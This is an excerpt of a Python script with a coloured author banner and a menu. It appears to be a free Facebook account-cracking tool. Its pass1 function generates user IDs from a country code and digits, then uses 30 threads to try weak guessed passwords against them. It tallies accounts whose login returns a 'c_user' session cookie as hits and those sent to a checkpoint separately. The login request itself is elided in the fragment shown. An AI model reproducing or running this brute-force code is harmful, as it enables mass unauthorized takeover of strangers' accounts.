...
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑\033[1;31m  \033[1;32mMRSH4MUL
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎N\033[1;31m  \033[1;32m0.8      
\033[1;32m 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m  \033[1;32mFREE
\033[1;37mJani LoG
\033[1;37m══════════════════════════════════════════════════"""
clear()
os.system("https://youtube.com/@HunterXfactz?si=ZDkEHt89Vd2QOSMN")
xxxx = str(len(ugen))
...
def main():
    ...
    if adi in ["1","01"]:
        ...
        os.system("xdg-open https://chat.whatsapp.com/01975549322")
        main()
    elif adi in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,uid,'091'+love,'092'+love,'094'+love,'22446688','qwertyuiopasdfghjkl','١٢٣٤٥٦','١٢٣٤٥٦٧٨']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[DILBER] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
